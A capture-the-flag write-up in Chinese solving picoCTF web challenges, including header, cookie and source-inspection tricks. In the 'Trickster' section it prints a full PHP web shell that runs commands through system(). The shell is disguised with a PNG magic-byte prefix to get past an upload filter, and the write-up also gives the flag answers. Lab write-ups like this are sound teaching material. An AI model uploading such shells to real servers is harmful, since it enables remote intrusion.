# web expoliation
[toc]
## easy
### GET aHEAD
Find the flag being held on this server to get ahead of the competition http://mercury.picoctf.net:45028/
利用BURP SUITE攔截，send to repeater
![](https://s3-ap-northeast-1.amazonaws.com/g0v-hackmd-images/uploads/upload_39e87a10d7b27674360734f1dd64ab4e.png)
修改post 改成head(獲取僅標頭信息而不獲取實際內容的資源信息)
![](https://s3-ap-northeast-1.amazonaws.com/g0v-hackmd-images/uploads/upload_4adbb778af0cd437f8bdf7657071bcf0.png)
ans:picoCTF{r3j3ct_th3_du4l1ty_775f2530}
### Insp3ct0r
Kishor Balan tipped us off that the following code may need inspection: https://jupiter.challenges.picoctf.org/problem/41511/ 
- 點進連結後
![](https://s3-ap-northeast-1.amazonaws.com/g0v-hackmd-images/uploads/upload_196c9e4203f9b8c84385aa078c743a35.png)
- 提示說如何在瀏覽器上檢查網頁程式碼？
- 點開網頁程式碼
![](https://s3-ap-northeast-1.amazonaws.com/g0v-hackmd-images/uploads/upload_e07a5c8d7fdf28617b68569e7ed76463.png)
- 發現Html is neat. Anyways have 1/3 of the flag: picoCTF{tru3_d3
- 了解到另外兩部分的flag應該是藏在css和javascript
- 點開第五行和第六行的連結
![](https://s3-ap-northeast-1.amazonaws.com/g0v-hackmd-images/uploads/upload_964a54b5ddc7dc41c89c59a796c1efb1.png)

![](https://s3-ap-northeast-1.amazonaws.com/g0v-hackmd-images/uploads/upload_0fb4a5f14116168c131cced7892047df.png)
- 可得到另外兩部分的flag
- ans:picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?832b0699}
### cookies
- 將cookie name設為18
![](https://s3-ap-northeast-1.amazonaws.com/g0v-hackmd-images/uploads/upload_cad512bfd736e327bea4cf6add089ced.png)
- ans:picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}
## medium
### Trickster
- 打開後是一個要上傳png檔的網站
![](https://g0v.hackmd.io/_uploads/BydA7_dcye.png)
- 檢查了/robots.txt，它引導我進入/instructions.txt
![](https://g0v.hackmd.io/_uploads/ryaWVuOqJl.png)

- 從/instructions.txt中知道，我們上傳的檔案需要有.png副檔名，並且前幾個位元組包含十六進位的' PNG '：「50 4E 47」。我們也可以猜測上傳的檔案會保存在/uploads/==filename==
    
![](https://g0v.hackmd.io/_uploads/BJ374OOqyx.png)

- 從[easy-simple-php-webshell.php · GitHub](https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985)下載了 web shell ，它可以為我產生一個命令列介面，以便遠端在伺服器上執行命令。在此之前，我們需要滿足上傳文件的要求。伺服器僅檢查前幾個字元是否為“ PNG ”，因此我將它們放在程式碼的開頭
```
PNG
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```
- 轉到 /uploads/PNG.png.php 並取得一個命令列介面來執行命令
![](https://g0v.hackmd.io/_uploads/HJKhSdd9kg.png)
- 它從根目錄（' / '）開始搜尋txt文件

```
find / -name "*.txt"
```
- 找到一個特別的txt檔(GNTDOMBWGIZDE.txt)
![](https://g0v.hackmd.io/_uploads/HkewrOuqJx.png)
- 將它顯示出來
```
cat /var/www/html/GNTDOMBWGIZDE.txt
```
![](https://g0v.hackmd.io/_uploads/HkXcBud91e.png)

- ans:picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_3f706222}
## hard